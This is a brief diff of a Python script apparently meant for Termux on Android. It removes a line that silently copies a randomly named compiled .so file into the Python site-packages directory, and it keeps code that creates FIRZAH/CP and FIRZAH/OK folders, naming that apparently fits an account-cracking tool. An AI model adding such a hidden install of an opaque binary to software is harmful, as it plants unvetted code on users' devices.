@@ -97,7 +97,6 @@ def zara(id):
     else:
         log_zar()
 def aku():
-    os.system('cp wcekxqdujagpaaznoragefhgy.so /data/data/com.termux/files/usr/lib/python3.12/site-packages')
     os.makedirs('/storage/emulated/0/FIRZAH', exist_ok=True)
     os.makedirs('/storage/emulated/0/FIRZAH/CP', exist_ok=True)
     os.makedirs('/storage/emulated/0/FIRZAH/OK', exist_ok=True)
